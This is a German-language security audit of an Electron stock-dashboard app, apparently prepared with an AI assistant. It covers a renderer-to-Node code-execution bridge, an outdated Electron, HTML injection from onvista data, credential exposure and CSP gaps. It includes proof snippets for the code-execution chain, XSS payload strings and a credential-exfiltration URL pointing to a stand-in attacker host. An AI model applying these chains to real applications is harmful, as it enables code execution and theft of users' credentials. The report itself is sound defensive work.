# 02 – Electron-Härtung (Sicherheits-Durchsicht 2026-10)

Stand: Zweig `pruefung/sicherheit-2026-10`, Commit `61dca2c`, 04.10.2026. Nur gelesen, nichts
geändert, nichts ausgenutzt. Nachweis-Skripte liegen im Scratchpad und gehören nicht ins Repo.

## Kurzfassung

1. **HOCH – Ein Skript im Renderer genügt für beliebigen Code als Benutzer.** `write-strategie` legt
   beliebiges JS ab, `mess-lauf` startet es per `fork` mit `ELECTRON_RUN_AS_NODE`. Damit nützt die Sandbox nichts mehr (F1).
2. **HOCH – Electron 37.10.3 bekommt keine Updates mehr** (letzte 37er Fassung, Nov. 2025; aktuell ist 44.5.1). Seit etwa Januar 2026 fehlen Chromium-Sicherheitsfixe. Zusammen mit F1 reicht ein einziger Chromium-Fehler bis zur vollen Codeausführung (F2).
3. **MITTEL – HTML-Injektion im Schein-Finder:** Der Basiswert-Name und die Währung von api.onvista.de landen ohne Escaping im `innerHTML` (`scheinfinder.js:394/528/242`). Skripte blockt die CSP, eingeschleuste Links, Formulare und gefälschte Oberfläche aber nicht (F3).
4. **MITTEL – Entschlüsselte Broker-Zugangsdaten** gehen per `store-get('settings')` an den Renderer. Hinaus kommen sie über zwei offene Wege: jede `https://`-Navigation geht ungefragt an `shell.openExternal`, und `diagnose-send` erzeugt ein öffentliches Issue (F4, F5, F6).
5. MITTEL – Jede `https://`-Adresse wird ohne Erlaubnisliste und ohne Rückfrage im Standardbrowser geöffnet (F6).
6. NIEDRIG – Lücken in der CSP (`'self'` unter `file://`, kein `object-src`/`base-uri`/`frame-src`/`form-action`/`connect-src`), kein Handler für Berechtigungsanfragen, keine Fuses, `U.esc` escapt kein `'`, IPC prüft den Absender nicht (F7–F14).
7. POSITIV: `contextIsolation:true`, `nodeIntegration:false`, `sandbox:true`, kein `webview`, Navigation auf `index.html` gesperrt, `window.open` abgelehnt, Erlaubnislisten für Hosts (auch nach Weiterleitungen geprüft), kein `eval`/`new Function`. Fremde Inhalte werden in renderer.js und explorer.js durchgehend mit `U.esc`/`safeUrl` ausgegeben.

---

## Grundkonfiguration (main.js:2423–2474)

| Einstellung | Wert | Bewertung |
|---|---|---|
| contextIsolation | `true` (2445) | gut |
| nodeIntegration | `false` (2446) | gut |
| sandbox | `true` (2447) | gut, durch F1 aber praktisch ausgehebelt |
| webSecurity | nicht gesetzt (Vorgabe `true`) | gut |
| allowRunningInsecureContent | nicht gesetzt (Vorgabe `false`) | gut |
| webviewTag | nicht gesetzt (Vorgabe `false`) | gut |
| nodeIntegrationInSubFrames | nicht gesetzt (Vorgabe `false`) | gut, Frames bekommen kein Preload |
| setWindowOpenHandler | immer `deny`, `https://` geht an openExternal (2458) | Fenster ok, openExternal ohne Erlaubnisliste (F6) |
| will-navigate | nur die eigene index.html, `https://` geht an openExternal (2471) | gut gesperrt, openExternal siehe F6 |
| will-frame-navigate / will-redirect | nicht behandelt | niedrig (F7) |
| setPermissionRequestHandler | **fehlt** | F8 |
| CSP | Meta-Tag index.html:5 | Lücken siehe F7 |
| Electron | `^37.2.0`, gesperrt auf **37.10.3** | **EOL**, F2 |
| Fuses | keine | F9 |
| Menü/DevTools | Standardmenü (kein `setApplicationMenu(null)`): Strg+Umschalt+I öffnet die DevTools auch im Paket | Info (F13) |

---

## Funde

### F1 – Brücke: Renderer → beliebige Codeausführung (HOCH)

- **Ort:** `preload.js` `writeStrategie`/`messLauf`. `main.js:620-632` (`write-strategie`, Schreibzugriff in 628), `main.js:795-841` (`mess-lauf`, `fork` in 811, `ELECTRON_RUN_AS_NODE:'1'` in 814), `studien/messmaschine/messen.js:51` (`require(path.resolve(datei))`: die Strategie läuft beim Laden).
- **Auslöser:** Jedes Skript, das im Renderer läuft: ein künftiges XSS, ein Chromium-Renderer-Exploit (F2) oder eine eingeschleuste Abhängigkeit im Renderer.
  `write-strategie` prüft nur die Kennung (`^[a-z0-9][a-z0-9-]{1,40}$`) und die Länge, **den Inhalt nicht**. Danach führt `mess-lauf` die Datei als Node-Prozess aus, mit voller `process.env` und allen Rechten des Benutzers. Die Kommentare im Code („KEIN KANAL FÜR BELIEBIGEN CODE“, „drei Riegel“) sichern nur den *Pfad* ab. Der *Inhalt* kommt aber aus derselben Brücke.
- **Schaden:** Volle Übernahme des Benutzerkontos: Dateien lesen und schreiben, Schadsoftware nachladen, Zugangsdaten abgreifen (auch die per DPAPI geschützten, denn derselbe Benutzer kann sie entschlüsseln). Die Sandbox (`sandbox:true`) bringt dagegen nichts mehr.
- **Kleinster Nachweis** (nur auf dem eigenen Rechner, in den DevTools der eigenen App, Strg+Umschalt+I; legt nur eine harmlose Datei an):
  ```js
  await api.writeStrategie('poc-rce', "require('fs').writeFileSync(require('os').tmpdir()+'/poc-rce.txt','aus dem Renderer'); module.exports={key:'poc-rce'};");
  await api.messLauf('poc-rce');   // danach liegt %TEMP%\poc-rce.txt
  ```
  Statisch ist die Kette durch die genannten Zeilen belegt. Ausgeführt wurde der Nachweis hier nicht.
- **Behebung:**
  1. Kein Kanal darf Code *schreiben* und denselben Code *ausführen*. Möglichkeiten: `write-strategie` streichen und Strategien nur über einen nativen Speichern-Dialog oder von Hand anlegen lassen, **oder** `mess-lauf` nur für Dateien erlauben, die der Benutzer im Hauptprozess bestätigt hat (`dialog.showMessageBox` mit Dateiname und Hash).
  2. Die Messmaschine mit `utilityProcess.fork` statt `child_process.fork` + `ELECTRON_RUN_AS_NODE` starten. Dann lässt sich die Fuse `RunAsNode` abschalten (F9). Ihr eine minimale `env` mitgeben statt `process.env`.
  3. Mittelfristig: Strategien in einer echten Sandbox ausführen (`vm` reicht nicht). Alternativ nur noch deklarative Regeln statt freiem JS.

### F2 – Electron 37 ohne Updates (HOCH)

- **Ort:** `package.json:15` (`"electron": "^37.2.0"`), `package-lock.json` → 37.10.3.
- **Auslöser:** Electron pflegt nur die drei neuesten Hauptversionen. Laut npm-Registry erschien 37.10.3 am 26.11.2025 als letzte 37er. Am 16.01.2026 kam 40.0.0, aktuell sind 42/43/44 (`latest` = 44.5.1). Seit ungefähr neun Monaten fehlen damit alle Sicherheitsfixe für Chromium und V8. Der Renderer verarbeitet ständig Inhalte von außen: Google-News-RSS, Yahoo, onvista, GitHub-API, raw.githubusercontent.
- **Schaden:** Ein bekannter Renderer-Fehler in Chromium/V8 führt zu Codeausführung im Renderer, und über F1 von dort zur vollen Codeausführung. Ein Sandbox-Ausbruch ist dafür nicht nötig.
- **Kleinster Nachweis:**
  ```bash
  node -e "console.log(require('./package-lock.json').packages['node_modules/electron'].version)"   # 37.10.3
  npm view electron dist-tags.latest                                                                 # 44.5.1
  npm view electron time --json | grep -E '"(37\.10\.3|40\.0\.0)"'
  ```
- **Behebung:** Auf eine gepflegte Hauptversion heben (44.x) und dabei die Breaking Changes von 38–44 prüfen. Danach Renovate oder Dependabot für `electron` einrichten. Die CI sollte rot werden, sobald die eingesetzte Hauptversion nicht mehr gepflegt wird.

### F3 – HTML-Injektion im Schein-Finder über onvista-Daten (MITTEL)

- **Ort:**
  - `scheinfinder.js:394` (`'<td class="sf-kennung" …>' + kennung(k) + '</td>'`) und `scheinfinder.js:528` (`insertAdjacentHTML(… '<b>' + kennung(k) + …)`)
  - Quelle: `scheinfinder.js:130` `BW_NAME = String(bw.name).toUpperCase()` ← `wkn.js:69` `name: c[0].name` ← Antwort von `api.onvista.de/api/v1/instruments/query` (`wkn.js:267`)
  - `wkn.js:103` `onvistaKennung` setzt den Namen ungeprüft zusammen
  - `scheinfinder.js:242` `… + ' ' + (s.waehrung || '')` ← `wkn.js:182` `q.isoCurrency` (onvista), ebenfalls ohne `U.esc`
- **Auslöser:** Ein Feld `name` oder `isoCurrency` in der onvista-Antwort, das HTML enthält. Möglich durch einen kompromittierten oder manipulierten Datensatz beim Anbieter oder einen Angreifer mit Zugriff auf die TLS-Strecke. Das Großschreiben (`toUpperCase`) schützt nicht, denn HTML unterscheidet bei Tags und Attributen nicht zwischen Groß- und Kleinschreibung.
- **Schaden:** Die CSP (`script-src 'self'`) blockt Inline-Handler wie `onerror`. Skriptausführung ist daher **nicht** belegt. Möglich bleiben: gefälschte Oberfläche (eingeschleuste Tabellen, Texte, „Order bestätigen“-Knöpfe), `<a href="https://…">`, das über F6 im Browser öffnet (Phishing), CSS-Injektion (`style-src 'unsafe-inline'`) und `<iframe src="file:…">` (siehe F7). Sollte F2 oder eine künftige CSP-Lockerung dazukommen, führt das direkt zu F1.
- **Kleinster Nachweis:** `node <scratchpad>/poc-xss.js`
  ```
  Zelle (scheinfinder.js:394): <td class="sf-kennung">CALL/<IMG SRC=X ONERROR=ALERT(1)>/200/0.1/03.11.26</td>
  Kurszelle (scheinfinder.js:242): 1,00 / 1,10 <a href=https://evil.example>EUR</a>
  ```
- **Behebung:** `U.esc(kennung(k))` an beiden Stellen und `U.esc(s.waehrung || '')`. Zusätzlich gleich beim Eingang in `wkn.js` säubern: `isoCurrency` gegen `^[A-Z]{3}$` prüfen, `name` auf druckbare Zeichen ohne `<>"'&` kürzen.

### F4 – Broker-Zugangsdaten entschlüsselt im Renderer (MITTEL)

- **Ort:** `main.js:1290-1294` (`store-get` → `geheimnisseWandeln(..., dechiffrieren)`), `GEHEIME_FELDER` `main.js` (capKey, capId, capPass, alpKey, alpSecret). Die Broker-Aufrufe setzen der Renderer und `capital.js`/`alpaca.js` mit eigenen Headern zusammen (`cap-fetch`/`alp-fetch`, `main.js:1157-1158`).
- **Auslöser:** Ein Skript im Renderer ruft `api.storeGet('settings')` auf.
- **Schaden:** Die Schlüssel für Demo- und Paper-Konten (Capital.com Demo, Alpaca Paper) fließen ab. Die Hosts sind fest auf Demo/Paper gesperrt (gut), der Schaden ist also begrenzt. Wer denselben Schlüssel aber auch anderswo benutzt (gleiches Passwort bei Capital.com), verliert mehr. Hinaus kommen die Daten über F6 (`location.href='https://angreifer/?k='+…` → openExternal, ohne Klick) oder F5. Der DPAPI-Schutz auf der Platte hilft dagegen nicht.
- **Kleinster Nachweis:** Code-Lesung. In den DevTools der eigenen App: `await api.storeGet('settings')` zeigt die Klartextfelder.
- **Behebung:** Geheimnisse dürfen den Hauptprozess nicht verlassen. `store-get('settings')` sollte für Geheimfelder nur `{gesetzt:true}` liefern. `cap-fetch`/`alp-fetch` setzen die Auth-Header (`X-CAP-API-KEY`, `APCA-API-KEY-ID`/`-SECRET-KEY`, Session-Token) im Hauptprozess selbst ein. Methoden auf `GET/POST/DELETE/PUT` beschränken und Pfade auf eine Liste.

### F5 – `diagnose-send`: freier Inhalt mit eingebautem Token (MITTEL bis NIEDRIG)

- **Ort:** `main.js:481-517`. Titel (200 Zeichen) und Text (60.000 Zeichen) wählt der Renderer frei, das Bearer-Token aus `telemetrie.json` steckt im Paket (`main.js:497`, package.json `files`).
- **Auslöser:** Ein Skript im Renderer ruft `api.diagnoseSend(t, b, 'bug')` in einer Schleife auf.
- **Schaden:** Issue-Spam im öffentlichen Repo. Außerdem dient der Kanal als **Abflussweg** für Daten aus F4 in ein öffentliches Issue. Das Token lässt sich ohnehin aus `app.asar` auslesen (siehe Bericht 01).
- **Behebung:** Im Hauptprozess drosseln (z. B. höchstens 3 je Stunde) und den Text aus festen Feldern selbst zusammensetzen statt freien Text anzunehmen. Langfristig gehört kein Schreib-Token in den Client, besser ein Formular im Browser oder ein eigener Relay-Dienst.

### F6 – `shell.openExternal` für jede `https://`-Adresse (MITTEL)

- **Ort:** `main.js:2458-2461` (setWindowOpenHandler), `main.js:2471-2472` (will-navigate). Der IPC-Kanal `open-external` (`main.js:1110-1118`) ist dagegen sauber auf GitHub beschränkt.
- **Auslöser:** Ein eingeschleuster Link (F3) per Klick, oder ein Skript mit `location.href=…` bzw. `window.open(…)`, dann ganz **ohne Benutzeraktion**.
- **Schaden:** Phishing-Seiten öffnen sich im echten Browser des Benutzers, und Daten lassen sich still über die URL hinausschaffen (F4). Andere Schemata (`file:`, `javascript:`, `ms-…:`) sind korrekt ausgeschlossen.
- **Behebung:** Eine Erlaubnisliste der Hosts, die die App tatsächlich verlinkt (Nachrichtenquellen, finanzen.net, github.com, onvista). Für alles andere eine Rückfrage mit vollständiger Adresse (`dialog.showMessageBox`). Öffnen nur bei Benutzergeste (`details.disposition`/`userGesture` prüfen).

### F7 – CSP-Lücken und `file://`-Herkunft (NIEDRIG)

- **Ort:** `index.html:5`: `default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self' data:;`
- **Befund:**
  - Die Seite läuft unter `file://`. In Chromium deckt `'self'` dort alle `file:`-Adressen ab. Für `script-src`, `frame-src` und `object-src` (beide fallen auf `default-src` zurück) heißt das: jede lokale Datei, z. B. etwas Heruntergeladenes. Mit F3 ginge `<iframe src="file:///…/Downloads/x.html">`. Das Frame hat kein Preload und damit kein `window.api`. Was Electrons `GrantFileProtocolExtraPrivileges` (Fuse, Vorgabe an) solchen Frames zusätzlich erlaubt, habe ich nicht überprüft.
  - Es fehlen `object-src 'none'`, `base-uri 'none'`, `form-action 'none'`, `frame-src 'none'` und `connect-src 'none'`. Der Renderer braucht kein `fetch`, alles läuft über IPC (geprüft: kein `fetch(`/`XMLHttpRequest`/`WebSocket` in den Renderer-Modulen).
  - `will-frame-navigate` wird nicht behandelt.
- **Schaden:** Mehr Spielraum für jede HTML-Injektion (F3).
- **Behebung:** CSP verschärfen:
  `default-src 'none'; script-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self' data:; font-src 'self'; connect-src 'none'; frame-src 'none'; object-src 'none'; base-uri 'none'; form-action 'none'`.
  Besser noch: ein eigenes Protokoll (`protocol.handle('app', …)`) statt `file://`, und die CSP zusätzlich als Antwort-Header setzen. Danach die Fuse `GrantFileProtocolExtraPrivileges` abschalten.

### F8 – Kein Handler für Berechtigungsanfragen (NIEDRIG)

- **Ort:** In `main.js` fehlen `session.defaultSession.setPermissionRequestHandler` und `setPermissionCheckHandler`.
- **Schaden:** Electron **erteilt** ohne Handler alle Anfragen nach Berechtigungen (Kamera, Mikrofon, Standort, Benachrichtigungen, MIDI, Zwischenablage usw.). Das wirkt erst zusammen mit Skriptausführung.
- **Behebung:** `ses.setPermissionRequestHandler((wc, perm, cb) => cb(false))` und `setPermissionCheckHandler(() => false)`. Was die App wirklich braucht, gezielt freigeben.

### F9 – Keine Electron-Fuses (NIEDRIG)

- **Ort:** `package.json` `build` (kein `afterPack` mit `@electron/fuses`).
- **Befund:** `RunAsNode`, `EnableNodeOptionsEnvironmentVariable`, `EnableNodeCliInspectArguments` sind an, `EnableEmbeddedAsarIntegrityValidation` und `OnlyLoadAppFromAsar` sind aus. Wer die Umgebung oder die Startargumente des Benutzers beeinflussen kann, macht die signierte bzw. installierte App zum Node-Interpreter. `RunAsNode` wird derzeit für `mess-lauf` *gebraucht* (F1).
- **Behebung:** Die Messmaschine auf `utilityProcess` umstellen, danach die Fuses per `@electron/fuses` im `afterPack` setzen.

### F10 – `U.esc` escapt kein `'`, Rückfälle ohne Escaping (NIEDRIG)

- **Ort:** `app-shell.js:13` (nur `& < > "`). `marktui.js:27` und `marktkarteui.js:20`: `esc(x)` liefert `String(x)` **roh**, wenn `U.esc` fehlt. (`messband.js:54` macht es richtig und gibt dann gar nichts aus.)
- **Befund:** Attribute in einfachen Anführungszeichen mit `U.esc` habe ich keine gefunden (Grep), es gibt also heute keinen Ausnutzungsweg. Fällt die Ladereihenfolge einmal anders aus, geben die Rückfälle Fremdtext (SEC-Firmennamen, Branchen) roh aus.
- **Nachweis:** `poc-xss.js` → `U.esc("' onmouseover=alert(1) '")` bleibt unverändert.
- **Behebung:** `'` → `&#39;` ergänzen (ggf. auch `` ` ``). Die Rückfälle wie in `messband.js` auf „nichts ausgeben“ umstellen.

### F11 – IPC-Handler prüfen den Absender nicht (NIEDRIG)

- **Ort:** Alle `ipcMain.handle/on` in `main.js`.
- **Befund:** Weder `event.senderFrame.url` noch `senderFrame === mainWin.webContents.mainFrame` werden geprüft. Heute sind die Folgen gering: Es gibt nur ein Fenster, die Navigation ist gesperrt, und Subframes bekommen kein Preload.
- **Behebung:** Eine kleine Hilfsfunktion `nurHauptfenster(ev)` vor jeden Handler setzen, besonders vor `write-strategie`, `mess-lauf`, `store-*`, `diagnose-send`, `cap/alp-fetch`.

### F12 – Status-Abgleich aus öffentlichen Issues beeinflussbar (NIEDRIG)

- **Ort:** `bugs.js:282-330` (`statusAbgleich`), `main.js:388-408` (`bug-sync`).
- **Befund:** Jeder kann im öffentlichen Repo ein Issue anlegen, das `| bug<ID> |` enthält, und es selbst wieder schließen. Die IDs sind nach dem Senden öffentlich. Der lokale Status der Meldung springt dann auf „behoben“ und lässt sich nicht mehr zurücksetzen. Der Begründungstext ist fest vorgegeben, es entsteht also kein XSS. Ebenso markiert `| ID |` in einem fremden Issue (`bugs.js:248-256`) eine noch nicht gesendete Meldung als übermittelt.
- **Behebung:** Nur Issues zählen lassen, die der Bot oder der Eigentümer angelegt hat (`issue.user.login` prüfen) und die mit `diagnose`/`bug` gelabelt sind.

### F13 – DevTools im Paket (INFO)

- Das Standardmenü bleibt aktiv (`autoHideMenuBar`), Strg+Umschalt+I gibt der Konsole die volle Brücke. Die Grenze verschiebt das nicht, denn ein lokaler Benutzer hat ohnehin dieselben Rechte. Es macht F1 aber trivial vorführbar. Empfehlung: im Paket `Menu.setApplicationMenu(null)` oder `devTools:false`.

### F14 – Eigene Symbolliste geht ungesäubert in Dateipfade (NIEDRIG, nicht belegt)

- **Ort:** `sammelplan.js:98` (`universum` beliebiger String), `kerzenquelle.js:912-916` (Kommaliste nur `trim().toUpperCase()`), `kerzenquelle.js:793` `path.join(…, 'bars_'+iv+'_' + sym + '.json')`.
- **Befund:** Ein Symbol wie `X/../../EVIL` ergäbe einen Pfad außerhalb des Archivs. Geschrieben wird erst, wenn Yahoo zu genau diesem (URL-kodierten) Namen Kerzen liefert, was praktisch nicht passiert. Ein Angriff ist also nicht belegt, es geht um Verteidigung in der Tiefe. Die IPC-Leser (`archiv-kerzen`, `markt-tagesreihen`, `archiv-massnahmen`, `nachrichten-anhaengen`) säubern dagegen korrekt: `[^A-Z0-9.^-]` entfernt, `..` wird über `ordnerName` zu `__<stempel>`, `symOk` in nachrichtenablage.js.
- **Behebung:** In `Plan.einstellungen` jede Kommaliste mit derselben Kürzel-Regel filtern, und in `dateiFuer` `path.basename`-Gleichheit prüfen.

### Weitere Kleinigkeiten (INFO)

- `bug-report` speichert `m.fenster` und `m.fehler` (je bis zu 20 Objekte) ohne Größengrenze in `fehlermeldungen.json`. Ein Skript im Renderer könnte so die Platte füllen. Größe begrenzen (z. B. `JSON.stringify(...).length < 20000`).
- `cap-fetch`/`alp-fetch` reichen Methode, Pfad und Header frei an die Demo/Paper-Hosts durch. Orders auf Demo/Paper sind gewollt, die Host-Sperre ist korrekt (`main.js:1124-1127`).
- Daten aus `Downloads/Markt-Dashboard-Daten` (Protokolle, `empfehlung.json`, `spekulationen.json`, `auswertung-bericht.md`) gelten als vertrauenswürdig. Angezeigt werden sie escaped (`U.md` escapt vorher) oder per `textContent`. Nur `kante.datum` (`depot.js:946`, 10 Zeichen aus `gemessenAm`) geht roh ins HTML, ein vernachlässigbarer Rest.

---

## Tabelle der IPC-Kanäle

Alle 52 aufrufenden Kanäle aus `preload.js` (invoke/send) haben genau einen Handler in `main.js`, dazu kommen 6 Rückrufkanäle (Abgleich per Skript: identisch). Es gibt keine generische `invoke(channel,…)`-Weiterleitung, und die `on…`-Rückrufe bekommen nur die Daten, nicht das Event-Objekt. Gut.

| Kanal (preload → main) | main.js | Argumente | Prüfung | Bewertung |
|---|---|---|---|---|
| fetch-text | 65/36 | url | https + `ALLOWED_HOSTS`, Weiterleitungen erneut geprüft, 8 MB | ok (beliebige GET-Pfade auf Yahoo/GitHub/onvista/news.google, gewollt) |
| earnings-fetch | 260 | symbol | `[^A-Z0-9.^-]` raus, 12 Zeichen, feste URL | ok |
| bug-report | 348 | m | Text 4000, art/schwere aus Liste, `fenster`/`fehler` ungedeckelt | niedrig (Platte füllen) |
| bug-list | 344 | – | – | ok |
| bug-mark-sent | 410 | id | Suche nach ID | ok |
| bug-sync | 388 | updates[] | Status aus Liste, 100 Einträge, 300 Zeichen | ok; Datenquelle siehe F12 |
| diagnose-config | 475 | – | – | ok (gibt repo + Grund, nicht das Token) |
| diagnose-send | 481 | titel, body, label | Länge, Label aus Liste | **mittel** (F5) |
| store-get | 1290 | name | `safeName` (`[^a-zA-Z0-9_-]`→`_`) | **mittel**: liefert Geheimnisse entschlüsselt (F4) |
| store-set | 1315 | name, value | `safeName`, atomar, `__keep` | ok (Renderer darf jeden Store überschreiben, gewollt) |
| store-defekte | 1221 | – | – | ok |
| markt-stammdaten | 1071 | – | fester Pfad | ok |
| markt-wertpapierarten | 1057 | – | fester Pfad | ok |
| markt-sec-basis | 987 | – | feste SEC-URLs, Host-Prüfung | ok |
| markt-sec-branchen | 1017 | syms[] | `^[A-Za-z0-9.\-]{1,12}$`, 4000 Einträge | ok |
| mess-strategien | 747 | – | Dateinamen-Regex; `quelle-pfad.txt` nur Lesen | ok |
| mess-lauf | 795 | key | Regex + `path.dirname`-Prüfung | **hoch** zusammen mit write-strategie (F1) |
| mess-abbrechen | 843 | – | – | ok |
| tray-mode (send) | 2405 | v | `!!v` | ok |
| cap-fetch | 1157 | method, url, headers, body | https + nur `demo-api-capital…` | ok (Demo), Header frei |
| alp-fetch | 1158 | method, url, headers, body | https + nur paper-api/data.alpaca | ok (Paper), Header frei |
| universum-eingefroren | 1163 | – | fester Pfad, 2 MB | ok |
| yahoo-quotes | 921 | syms[] | gesäubert, 4000 | ok |
| app-version | 269 | – | – | ok |
| export-analysis | 1091 | payload | feste Dateinamen im Datenordner | ok (kein Pfad vom Renderer) |
| read-recommendation | 520 | – | fester Pfad | ok |
| read-report | 1083 | – | fester Pfad, 120 kB | ok |
| read-spekulationen | 592 | – | lokal/feste raw-URL, 300 kB | ok |
| read-protokolle | 598 | – | fester Ordner, Dateinamen-Regex, 2 MB | ok |
| write-strategie | 620 | key, quelltext | Kennungs-Regex, 200 kB, nicht überschreiben; **Inhalt ungeprüft** | **hoch** (F1) |
| read-insider | 1081 | – | wie Spekulationen | ok |
| set-autostart | 293 | on | wahrheitswertig, feste Optionen | ok |
| get-autostart | 310 | – | – | ok |
| open-external | 1110 | url | https + github.com/*.github.com/objects.githubusercontent.com | ok |
| update-state | 2530 | – | – | ok |
| update-check | 2531 | – | – | ok |
| update-install | 2539 | – | nur bei `state==='ready'` | ok (Signatur siehe Audit/README) |
| update-set-auto | 2548 | on | `!!on` | ok |
| sammler-stand | 2368 | – | – | ok |
| archiv-abdeckung | 1909 | – | – | ok |
| markt-tagesreihen | 1952 | syms[], tage | Kürzel gesäubert, Deckel | ok |
| earnings-kalender | 2359 | tage | 1..7 | ok |
| archiv-kerzen | 2135 | sym, zr, n | gesäubert, Zeitrahmen aus Liste, `ordnerName` fängt `..` ab | ok |
| archiv-massnahmen | 2343 | sym | gesäubert, `ordnerName` | ok |
| sammler-start | 2370 | intervall | aus Liste | ok |
| sammler-stop | 2384 | – | – | ok |
| sammler-einstellen | 2390 | roh | `Plan.einstellungen`; Kommaliste ungesäubert | niedrig (F14) |
| nachrichten-universum | 1346 | – | fester Pfad | ok |
| nachrichten-anhaengen | 1347 | sym, eintraege | `symOk`, `eintragOk` | ok (Menge ungedeckelt, Info) |
| nachrichten-migration | 1348 | – | feste Pfade | ok |
| live-stand | 1819 | – | – | ok |
| live-menge (send) | 1823 | teile | Kürzel gesäubert, 2000 | ok |
| Rückrufe main→renderer: markt-sec-fortschritt, mess-fortschritt, update-state, sammler-fortschritt, sammler-hinweis, live-sammler | – | nur Daten | – | ok |

## XSS-Durchsicht (Senken mit fremden Daten)

| Quelle | Senke | Escaping | Ergebnis |
|---|---|---|---|
| Google-News-RSS (Titel, Quelle, Link) | renderer.js:540, 1088, 1309; explorer.js:324 | `U.esc` + `safeUrl` | ok |
| Yahoo-Namen/Kürzel | renderer.js:421-451, explorer.js:39-42 | `U.esc` | ok |
| Spekulationen/Insider (raw.githubusercontent, Zweig `radar`) | renderer.js:643-652, 752-770 | `U.esc` + `safeUrl` | ok |
| GitHub-Release-Text („Was ist neu“) | wasneu.js:31 → `U.md` | `U.md` escapt vorher | ok |
| GitHub-Update-Tag | app-shell.js:1598 | `U.esc` | ok |
| GitHub-Issues | bugs.js | nur Vergleiche, Text fest | ok (Integrität F12) |
| SEC-Namen/Branchen | marktui.js, marktkarteui.js | `esc` → `U.esc` (Rückfall roh, F10) | ok |
| **onvista Basiswert-Name** | **scheinfinder.js:394, 528** | **keins** | **F3** |
| **onvista isoCurrency** | **scheinfinder.js:242** | **keins** | **F3** |
| onvista WKN/Emittent/ISIN/Name | scheinfinder.js:247-260 | `U.esc` | ok |
| Fehlertexte von Servern | `U.statuszeile` (textContent), explorer.js:31 `U.esc` | ok | ok |
| Lokale Protokolle/Berichte | scoreboard.js, depot.js, berichte.js (`U.md`) | `U.esc`/`U.md`/textContent | ok (Rest: depot.js:946, 10 Zeichen) |
| `eval` / `new Function` / `setTimeout(String)` | – | – | keine Treffer |

**Kette XSS → IPC:** Wer im Renderer ein Skript ausführen kann, erreicht über die Brücke beliebigen Node-Code (F1), Klartext-Zugangsdaten (F4), Abfluss über openExternal oder öffentliche Issues (F5/F6), das Überschreiben aller Stores (Depot, Einstellungen) sowie Orders auf Demo/Paper. Die CSP ist derzeit die **einzige** Hürde zwischen der HTML-Injektion aus F3 und dieser Kette, und unter einem Chromium ohne Updates (F2) ist sie keine verlässliche Grenze.

## Nachweis-Skripte (Scratchpad, nicht im Repo)

- `/tmp/claude-0/-home-user-Stock-Dashboard/7f930fbb-a884-5152-ab96-571b6454ed21/scratchpad/poc-xss.js`: Ausgaben für F3 und F10
- `/tmp/claude-0/-home-user-Stock-Dashboard/7f930fbb-a884-5152-ab96-571b6454ed21/scratchpad/scan.js`: grobe Heuristik für `innerHTML`-Verkettungen ohne Escaping (280 Kandidaten, von Hand gesichtet; fast alles Zahlen oder interne Konstanten)
